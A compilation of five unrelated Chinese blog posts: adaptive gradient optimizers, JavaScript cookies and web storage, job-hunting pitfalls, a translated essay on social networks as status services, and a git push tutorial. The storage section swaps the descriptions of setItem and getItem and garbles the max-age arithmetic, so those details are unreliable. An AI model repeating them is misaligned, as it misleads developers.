其中,\(\nabla J(\theta_i)_t\)表示t时刻变量\(\theta_i\)的梯度。\(\sum_{\tau =1}^t \nabla J(\theta_i)_\tau\)就表示变量\(\theta_i\)历史累积的梯度值 ，用来修正学习率。加上很小的值\(\tau\)是为了防止0的出现。
AdaGrad虽然能够动态调整变量的学习率，但是其有两个问题：

仍然需要手动的设置一个初始的全局学习率
使用变量的历史累积梯度来调整学习率，这就导致其学习率是不断衰减的，训练后期学习速率很小，导致训练过早停止。

后面的几种自适应算法都是对AdaGrad存在的上述问题进行修改.
RMSprop
RMSprop是Hinton在他的课程上讲到的，其算是对Adagrad算法的改进，主要是解决学习速率过快衰减的问题。其思路引入了动量（指数加权移动平均数）的方法，引入了超参数\(\gamma\),在累积梯度的平方项近似衰减：
\[
\begin{align*}
s_{(t,i)} &= \gamma s_{(t-1,i)} + (1-\gamma) \nabla J(\theta_i)_t \odot \nabla J(\theta_i)_t \\
\theta_{(t,i)} &= \theta_{(t-1,i)} - \frac{\eta}{\sqrt{s_{(t,i)} + \epsilon}} \odot \nabla J(\theta_i)_t
\end{align*}
\]
其中，\(i\)表示第\(i\)个变量，\(t\)表示\(t\)时刻更新，\(\gamma\)是超参数通常取\(\gamma=0.9\)。\(s_{(t,i)}\)表示梯度平方的指数加权移动平均数，用来代替AdaGrad中不断累加的历史梯度，有助于避免学习速率衰减过快的问题。同时Hinton也建议将全局的学习率\(\eta\)设置为0.001。
AdaDelta
AdaDelta对AdaGrad进行两方面的改进：

学习率衰减过快
全局学习率超参数问题

针对学习率衰减过快的问题，其思路和RMSprop一样，不在累积所有的历史梯度，而是引入指数加权平均数，只计算一定时间段的梯度。
\[
\begin{align*}
s_{(t,i)} &= \gamma s_{(t-1,i)} + (1-\gamma) \nabla J(\theta_i)_t \odot \nabla J(\theta_i)_t \\
\theta_{(t,i)} &= \theta_{(t-1,i)} - \frac{\eta}{\sqrt{s_{(t,i)} + \epsilon}} \odot \nabla J(\theta_i)_t
\end{align*}
\]
为了解决学习率超参数的问题，AdaDelta维护了一个额外的状态变量\(\Delta \theta_t\)，根据上面的公式有
\[
\Delta \theta_t = - \frac{\eta}{\sqrt{s_{(t,i)} + \epsilon}} \odot \nabla J(\theta_i)_t
\]
上述使用的是梯度平方的指数加权移动平均数，在AdaDelta中作者又定义了：每次参数的更新值\(\Delta \theta\)的平方的指数加权移动平均数
\[
E(\Delta \theta^2)_t = \gamma E(\Delta \theta^2)_{t-1} + (1 - \gamma)\Delta \theta^2_t
\]
因此每次更新时，更新值的均方根（Root Mean Squard,RMS)
\[RMS(\Delta \theta)_t = \sqrt{E(\Delta \theta^2)_t +\epsilon }\]
使用\(RMS(\Delta \theta)_{t-1}\)来近似更新\(t\)时刻的学习速率\(\eta\)，这样可以得到其更新的规则为
\[
\theta_{(t,i)} = \theta_{(t-1,i)} - \frac{RMS(\Delta \theta)_{t-1}}{\sqrt{s_{(t,i)} + \epsilon}} \odot \nabla J(\theta_i)_t
\]
设初始的\(RMS(\Delta \theta)_0 = 0\)，这样就不用设置默认的学习速率了。 也就是，AdaDelta和RMSprop唯一的区别，就是使用\(RMS(\Delta \theta)_{t-1}\)来代替超参数学习速率。 至于为什么可以代替，使用牛顿迭代的思想，这里不再说明，有兴趣可以参看原始论文ADADELTA: An Adaptive Learning Rate Method 。
Adam
Adaptive moment estimation,Adam 是Kingma等在2015年提出的一种新的优化算法，其结合了Momentum和RMSprop算法的思想。相比Momentum算法，其学习速率是自适应的，而相比RMSprop，其增加了冲量项。所以，Adam是两者的结合体。
Adam不只使用梯度平方的指数加权移动平均数\(v_t\)，还使用了梯度的指数加权移动平均数\(m_t\)，类似动量。
\[
\begin{aligned} m_{t} &=\beta_{1} m_{t-1}+\left(1-\beta_{1}\right) g_{t} \\ v_{t} &=\beta_{2} v_{t-1}+\left(1-\beta_{2}\right) g_{t}^{2} \end{aligned}
\]
可以看到前两项和Momentum和RMSprop是非常一致的， 由于和的初始值一般设置为0，在训练初期其可能较小，需要对其进行放大
\[
\begin{aligned}
\hat{m}_{t}&=\frac{m_{t}}{1-\beta_{1}^{t}}\\
\hat{v}_{t}&=\frac{v_{t}}{1-\beta_{2}^{t}}
\end{aligned}
\]
这样就得到了更新的规则
\[
\theta_{t+1}=\theta_{t}-\frac{\eta}{\sqrt{\hat{v}_{t}}+\epsilon} \hat{m}_{t}
\]
作者建议\(\beta_1\)设置为0.9,\(\beta_2\)设置为0.999，取\(\epsilon = 10^{-8}\)。
Summary
下图给出各个梯度下降算法的可视化下降过程

本文综述了一些常见的梯度下降方法，主要是自适应梯度下降。 由于超参数学习速率的难以设定，自适应梯度下降有很好的实用价值。除了使用自适应梯度下降算法外，也可以手动的设定学习速率的自适应过程，例如学习速率的多项式衰减等。

********************************************************************************************************************************************************************************************************
[JavaScript] Cookie,localStorage,sessionStorage概述
Cookie
Cookie 是一些数据, 存储于你电脑上的文本文件中,当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。Cookie 的作用就是存储 web 页面的用户信息
javascript 中使用 document.cookie 属性进行 cookie 的创建/读取/删除
//读取
allCookies = document.cookie;
//写入
document.cookie = newCookie;
//删除,设置 expires 参数为过期时间
document.cookie="hello=world; expires=Thu, 18 Dec 2043 12:00:00 GMT;"
Cookie 的属性值

;path=path (例如 '/', '/mydir') 如果没有定义，默认为当前文档位置的路径。
;domain=domain (例如 'example.com'， 'subdomain.example.com') 如果没有定义，默认为当前文档位置的路径的域名部分。与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的 cookie。如果指定了一个域，那么子域也包含在内。
;max-age=max-age-in-seconds (例如一年为 606024*365)
;expires=date-in-GMTString-format 如果没有定义，cookie 会在对话结束时过期
这个值的格式参见 Date.toUTCString()
;secure (cookie 只通过 https 协议传输)


cookie 的值字符串可以用 encodeURIComponent()来保证它不包含任何逗号、分号或空格(cookie 值中禁止使用这些值)

浏览器个数限制

IE6 或更低版本最多 20 个 cookie
IE7 和之后的版本最后可以有 50 个 cookie。
Firefox 最多 50 个 cookie
chrome 和 Safari 没有做硬性限制

Cookie 的缺点

Cookie数量和长度的限制。每个 domain 最多只能有 20 条 cookie，每个 cookie 长度不能超过 4KB，否则会被截掉。
安全性问题。如果 cookie 被人拦截了，那人就可以取得所有的 session 信息。即使加密也与事无补，因为拦截者并不需要知道 cookie 的意义，他只要原样转发 cookie 就可以达到目的了。
有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。

Cookie 的安全问题
路径限制并不能阻止从其他路径访问 cookie. 使用简单的 DOM 即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的 iframe, 然后访问其 contentDocument.cookie 属性). 保护 cookie 不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取. Web 应用程序通常使用 cookies 来标识用户身份及他们的登录会话. 因此通过窃听这些 cookie, 就可以劫持已登录用户的会话. 窃听的 cookie 的常见方法包括社会工程和 XSS 攻击.
解决安全问题的建议

通过良好的编程，控制保存在 cookie 中的 session 对象的大小。
通过加密和安全传输技术（SSL），减少 cookie 被破解的可能性。
只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。
控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie。

localStorage 和 sessionStorage

返回值是一个 Storage 对象,可以添加、修改或删除存储的数据项
只在本地存储,localStorage 和 sessionStorage 的数据不会跟随 HTTP 请求一起发送到服务器,cookie 会发送
数据存储在 localStorage,它们都特定于页面的协议
localStorage 和 sessionStorage 中的键值对总是以字符串的形式存储。 (键值对总是以字符串的形式存储,数值类型会自动转化为字符串类型)
localStorage 和 sessionStorage 不能被爬虫抓取到
不同浏览器无法共享 localStorage 或 sessionStorage 中的信息
相同浏览器的不同页面间可以共享相同的 localStorage（同源策略）,但是不同页面或标签页间无法共享 sessionStorage 的信息(多个 iframe 算是同源页面)
各浏览器支持的 localStorage 和 sessionStorage 容量上限不同,最低目前在 1m 以上support-test

localStorage 和 sessionStorage 不同

localStorage 属性允许你访问一个 Document 源（origin）的对象 Storage,sessionStorage 属性允许你访问一个 session Storage 对象
存储在 sessionStorage 里面的数据在页面会话结束时会被清除(页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话),也就关闭浏览器会清除.localStorage 存储的数据能在跨浏览器会话保留,存储在 localStorage 的数据可以长期保留

localStorage 和 sessionStorage 方法

key() 该方法接受一个数值 n 作为参数，并返回存储中的第 n 个键名(Storage 的方法)
setItem(key,data) 该方法接受一个键名作为参数，返回键名对应的值
getItem(key) 该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值
removeItem(key) 该方法接受一个键名作为参数，并把该键名从存储中删除
clear() 调用该方法会清空存储中的所有键名

sessionStorage 的使用(localStorage 差不多)
function initSession() {
    sessionStorage.clear();
}

function getSession(name) {
    if (sessionStorage.getItem(name)) {
        return JSON.parse(sessionStorage.getItem(name));
    }
}

function setSession(name, data) {
    var store = sessionStorage.getItem(name);
    if (store) {
        console.warn(name + "=>数据在sessionStorage已存在,执行替换操作");
        sessionStorage.removeItem(name);
    }
    sessionStorage.setItem(name, JSON.stringify(data));
}

//sessionStorage 用于临时保存同一窗口(或标签页)的数据，在关闭窗口或标签页之后将会删除这些数据
export { initSession, getSession, setSession };
Docs
MDN - document.cookie
MDN - localStorage
MDN - sessionStorage
MDN - Storage
Cookies and Security
JavaScript Cookie

********************************************************************************************************************************************************************************************************
太坑了｜还真有这么渣渣的公司....
又到了金三银四的季节，一波又一波的求职大潮疯涌而至！
从2018年年底开始，各类「缩招」、「优化」、「cai 员」的消息也是不断出现，这个消息让一些找工作的人颇感到了压力。
其实，这并不是一件坏事！
年底了，要慎重，这是一个不太好的信号....
特别是2019年应届毕业生人数高达860万，就连互联网行业的招聘需求也在下降，据数据统计，互联网行业在第三季度的招聘量和去年相比竟然下降了51%。由此可见，就业压力重锤来袭。

的确如此，这个求职的压力也是一年比一年严重，很多人也放弃了暂时就业的机会，而选择了去考研。
就在昨天，群里一位小伙伴吐槽了他最近的「遭遇」：

 
突然想起了，前段时间网上流传的一个案例：「上午还在码代码，下午五分钟就让你打包走人」。
本来以为只有电视剧才有的狗血镜头，竟然再一次出现在现实生活环境中，真没想到，都9102年了，还有这么渣渣的公司！

大概的情节民工哥稍微梳理了一下：
这位伙伴入职的offer写明试用期只有一个月，但是，由于经验不足在入职时签定的合同里，并没有写明试期，而且合同并非与offer上的公司所签定（很多求职者很容易忽略这个问题）。入职后，也按要求对公司目前的环境与需求进行了规划与整理，并且也搭建好了一系列的平台，最后，就因为一句试用期不合格的理由将其辞退，让人感觉有此牵强。

对于一般情况下来讲，面试合格之后进入试用期，应该来说考查更多的是求职者的工作态度、为人处事的能力等等情况，对于求职者本身的技术能力来说，在当时面试时肯定会有一定的掌握了（当然除了面试官不是很专业或者根本就没有在意除外）。
 
就来身对于这个事件来说，既然已经发生了，不再好去纠结到底是谁的错误的问题了。毕竟求职者在一定程度上仍然是处于「弱势状态」，发出来也只想对读者朋友们有一定的提醒而已。
这之前，民工哥也发过相关的文章

特别在今年这种形势不太好，就业压力巨大的情况之下，真的找个工作不容易，被坑了更不好。
所以，民工哥在此说几点自己的看法，希望能帮助到在找工作的读者伙伴们，真的是入坑不容易啊：
1、求职一定要注意看公司的相关信息，如成立时间、评价、有无负面或违规信息的等等，尽早识别皮包、传销类的企业，防止掉坑里起不来啊。现在互联时代，信息发达，想查看个信息（只要不是商业机密）我想应该都不是什么难事。
2、入职前一定确认好你所需求的信息，比如：试用期时间、第一次合同期限（这个和试用期长短相关）、工作地点、薪资的构成等等。当然了，如果一家正规则的企业，这些信息我想offer上一定会写的很清楚明白。
3、入职当天签定合同时，也需要核对好之前的信息是否相一致。有异议马上提出来，不要因为怕第一天上班得罪HR而不敢提，这样只会害了自己，一旦后面发现问题，也会产生不必要的麻烦。
4、试用期工作还是要认真对待，但千万要眼观四路，耳听八方。很多时候，是有这种企业存在的：招个试用期的劳力，来把原来未能解决的问题或暂时公司内部无人可做的了的事给做了，然后，期未满请你打包走人，有没有这种公司？答案是肯定的：肯定有，多少的问题。企业考虑到成本，有时候招一个全职的岗位划不来，但是又需此岗位的存在，这是事实存在的情况。
5、凡事多留个心眼总没有坏处，比如：劳动合同一定要自己有一份，能证明有劳务关系的直接证据之一；再有比如：工资的流水啊、考勤记录等等。之前不是也讲过么，很多公司工资以”为你避税“的由头以「支付宝」、「微信」的形式支付。
6、多与自所在的同行伙伴们建立一定的人脉联系，这样，在所在的地区中一些信息可以大家共享（民工哥也建立了相关的技术群，需要的公众号后台回复：”加群“进入），比如：哪些公司较好、很靠谱，哪些公司是黑名单上的，平时也可以有一些内部推荐的信息，都是资源共享的好处。
7、求职前要想清楚，有计划。一定不要为了工作而工作，肯定就有人讲了，尼码我都没饭吃了，还不抓紧随便找个工作先干着得了，如果说真到了这种时候，那你真得好好问问自己为何混的如此惨？高薪必然是需要某些东西去交换的，等价交换是这个世界的王道，你既想舒服，又想高薪很难有这种事。
8、不要只顾眼前利益，不管长远发展。很多人都有这种心理，其实也很正常，是个人都会有这种状态。但是，还是得权衡利弊的，毕竟工作在很大程度上也会影响到你的生活，而你的生活质量必将会影响你的人生质量。所以，在感觉到公司不对劲的时候，要早做打算，谋定而后动。
读到这里的小伙伴，请将此文转发分享出去，以便让更多的小伙伴们能够早点识破某些「渣渣企业」的小九九、小手段、小把戏，早日脱离苦海。
今日话题：
留言分享、吐槽你在求职中、工作中遇到的「坑事」、「渣公司」、「渣老板」、「渣领导」或者「防坑小妙招」。走心的留言说不定有惊喜的可能哦！！
********************************************************************************************************************************************************************************************************
社会地位即服务, Status as a Service (一): 社交网络是一种 ICO 行为？

上周，看到 Eugene Wei 又发了一篇长文，Status as a Service (StaaS)。状态即服务？服务器的状态吗？不知所言。抱着好奇，我打开了这篇文章，一看就是 3 个小时！😭
这篇文章其实是对社交网络的分析。凭良心讲，称之为有史以来对社交网络最全面、最牛逼的分析，并不过分。我是从前一篇文章《隐形的渐近线》才开始关注他的。前文大约 1 万字，这篇文章是它的 2 倍。
抱着学习和分享的精神，我决定开始慢慢翻译。请把这当作是某位陌生网友的行为艺术。因为原文实在太长，共 26 个章节，可能会把它分成 5 篇译文发出来。这篇译文是前 5 个章节。
当然，正如作者所声称的，他的文章是 80% fat free。(说明还是有些脂肪的 😏) 但我觉得呢，原文实在太有趣了，所以尽量按照作者的本意，一字一句翻译。考虑到译者精力有限，而且还要和自己的懒惰作斗争，全部翻译完可能会花一些时间。如果你感兴趣，推荐直接看原文。

追求社会地位的猴子
“凡是没钱的人，总想要更多社会资本，这已经成了一条举世公认的真理。”
简·奥斯汀这样写道；或者说，我觉得她会这么写，如果她来记录我们这个时代的话。(还好，我们有 Taylor Lorenz，谢天谢地。)
让我们从两个原则开始：

人是追求社会地位的猴子
人会追求最有效的途径，来追寻社会资本最大化


“追求社会地位的猴子” 将是我的独立乐队的名字，如果我学会弹吉他并开始组乐队的话

我从这两条对人性的解读开始分析，是因为很少有人会质疑它们。但是，尽管有些社交网络可能是有史以来上规模最大、发展最快的公司，我却很少看到有人，从社会地位或社会资产这两个维度，对其做分析。
一定程度上，这是社会资本的衡量难题。数字提供了合理性、可信度。我们往往有办法来计算并衡量金融资本及其流动路径。大量的网站、报纸和专业机构会精确报告货币的价格和变动情况。
但我们却没法衡量社会资本的价值及流动路径，至少没有足够精密、准确的办法。这个领域内的研究，范围太宽泛，成果又太少。如果除了用户数，我们还有更好的衡量标准，那么这类分析文章将充斥着统计图表，让人看上去有一种智慧感。好比 Mary Meeker 的《互联网趋势报告》，还会有一份名为《社交网络的现状》的年度报告；或者，这五十页内容将成为她报告中的一部分。
尽管如此，我们所研究的大多数社交媒体网络，所产生的社会资本远远超出它们实际产生的金融资本，特别是在早期阶段；几乎所有这些公司，都接受了硅谷内一种流行的论调：在早期，公司应该推迟创收，转而快速地扩大网络的覆盖范围。为什么有的社交网络会出现 “蒸发冷却效应”，进入 “失速期”，有时甚至消失得无影无踪？这些问题都和社会资本有关。并且，虽然我们可能无法量化社会资本，但作为敏感的社会性动物，我们仍可感知到它的存在。
在许多方面，社会资本是金融资本的一个主要指标，因此社会资本的性质也备受关注。它不仅是良好的投资或商业活动，分析社会资本的动态发展还可以帮助我们解释各种线上行为，否则这些行为都似乎不具合理性。
过去几年里，人们在分析软件即服务 (SaaS, Software as a Service) 业务上取得了很多进展，但在分析社交网络上却较少。我感觉，现在很多对社交网络的分析文章，就像是 Paul Romer 发布《内生技术变革》之前的经济增长理论。但是，如果我们将其视为 SaaS 业务，我们就可以揭开社交网络的神秘面纱；只不过，社交网络提供的不是软件，而是社会地位。这篇文章，将深入探讨被我称之为社会地位即服务 (StaaS, Status as a Service) 的业务。
请把这篇文章当作是我所坚信的一系列假说；因为缺乏相关数据，难以确知或论证。和往常一样，我聪明的读者一定会对其做加减法。
传统的网络效应模型
成功的社交网络，有一个基本的经验教训：当用户数很少时，它必须足够吸引人。通常，这是通过某种形态的单用户工具型功能实现的。
这是经典的社交冷启动问题。传统的 “鸡与蛋” 问题其实已有答案：先来了一只鸡，然后又来了一只鸡，然后又来了一只鸡，依此类推。更难回答的问题是，为什么在没有其他鸡到来之前，第一只鸡会先来到这里，并留下，以及为什么其他鸡会跟着它来。
第二个基本的经验教训是，社交网络必须有强网络效应。这样，随着越来越多的用户加入，社交网络进入高速的正增长循环，正面的网络效应带来复利价值，从而导致指数级增长，最终让投资者和员工看到数不完的钞票。Chris Dixon 写道，“为工具而来，为网络而留”。这或许是最令人难忘的格言。
在社交网络出现之前，我们就有了梅特卡夫定律 (Metcalfe's law, 一个关于电信网络的价值和技术发展的定律)：

电信网络的价值与连接的用户数的平方成正比 (n^2)

这个定律完全可以套在社交网络上。它如此直观，有一个诱人的数学公式，可以解释为什么社交网络的增长曲线，会在经典的 S 型增长曲线的脚踝处向上急转弯。
但深挖后，仍有许多问题。为什么一些大型社交网络会突然消失，或输给新的小型社交网络？为什么一些优秀的单用户工具型产品无法转变为社交网络，而那些看似毫无意义的产品却实现了质的飞跃？为什么一些社交网络在用户数增加时失去价值？为什么不同的社交网络会在不同的用户规模期 “失速”？为什么有些社交网络能轻松跨越国界，而有些社交网络则被锁定在一些特定国家内？如果梅特卡夫定律成立，为什么 Facebook 克隆了许多其他社交网络的功能，大部分都以失败告终，而有些却能获得成功，比如 Instagram Stories？
把这些问题的解释串在一起的，是社会资本理论。当我们分析社交网络时，应该包括，对社交网络中社会资本资产的积累效应，以及对地位博弈游戏的性质和结构的研究。换句话说，不管有意无意，这些社交网络公司是如何利用 “人是追求社会地位的猴子，总是试图以最有效的方式追求更多社会资本” 这一事实的？
用 Nicki Minaj 的话来说，“If I'm fake I ain't notice cause my followers ain't.” (有人质疑我假，我不管，只要我的粉丝是真的)

编者注：有时粉丝 (followers) 其实是假的。


********************************************************************************************************************************************************************************************************
git命令详解（ 四 ）
此篇为git命令详解的第四篇，话不多说，我们直接上知识点好吧
　　 git Push
　　偏离的工作
　　
gitPush:
　　此命令负责将你的变更上传到指定的远程仓库，并在远程仓库上合并你的新提交记录。一旦 git push 完成, 你的朋友们就可以从这个远程仓库下载你分享的成果了！你可以将 git push 想象成发布你成果的命令，注意：git push 不带任何参数时的行为与 Git 的一个名为 push.default 的配置有关。它的默认值取决于你正使用的 Git 的版本

 
执行命令：git push
 
好了，git push 命令没什么可以提交的
我们接下来看一个比较复杂一点的问题
偏离的工作：
假设你周一克隆了一个仓库，然后开始研发某个新功能。到周五时，你新功能开发测试完毕，可以发布了。但是 —— 天啊！你的同事这周写了一堆代码，还改了许多你的功能中使用的 API，这些变动会导致你新开发的功能变得不可用。但是他们已经将那些提交推送到远程仓库了，因此你的工作就变成了基于项目旧版的代码，与远程仓库最新的代码不匹配了。

这种情况下, git push 就不知道该如何操作了。如果你执行 git push，Git 应该让远程仓库回到星期一那天的状态吗？还是直接在新代码的基础上添加你的代码，异或由于你的提交已经过时而直接忽略你的提交？
因为这情况（历史偏离）有许多的不确定性，Git 是不会允许你 push 变更的。实际上它会强制你先合并远程最新的代码，然后才能分享你的工作。
下面我们看一下实际的例子

执行命令：git Push

看见了吧？什么都没有变，因为命令失败了！git push 失败是因为你最新提交的 C3 基于远程分支中的 C1。而远程仓库中该分支已经更新到 C2 了，所以 Git 拒绝了你的推送请求
那该如何解决这个问题呢？很简单，你需要做的就是使你的工作基于最新的远程分支。
有许多方法做到这一点呢，
方案一
不过最直接的方法就是通过 rebase 调整你的工作。咱们继续，看看怎么 rebase！

执行命令：git fetch
　　　　    git rebase o/master
　　　　　git push


我们用 git fetch 更新了本地仓库中的远程分支，然后用 rebase 将工们的工作移动到最新的提交记录下，最后再用 git push 推送到远程仓库。
 方案二
还有其它的方法可以在远程仓库变更了以后更新我的工作吗? 当然有，我们还可以使用 merge
尽管 git merge 不会移动你的工作（它会创建新的合并提交），但是它会告诉 Git 你已经合并了远程仓库的所有变更。这是因为远程分支现在是你本地分支的祖先，也就是说你的提交已经包含了远程分支的所有变化。

执行命令：git fetch
　　　　　git merge o/master
　　　　　git push

 
 
方案三
很好！但是要敲那么多命令，有没有更简单一点的？
当然 —— 前面已经介绍过 git pull 就是 fetch 和 merge 的简写，类似的 git pull --rebase 就是 fetch 和 rebase 的简写！
让我们看看简写命令是如何工作的。

执行命令：git pull --rebase
　　　　　git push

 
 方案四
　　我们也可以使用git pull 来解决这个问题

执行命令：git pull
　　　　　git push


 
偏离的历史是非常重要的一部分，希望大家能好好看一下子

********************************************************************************************************************************************************************************************************
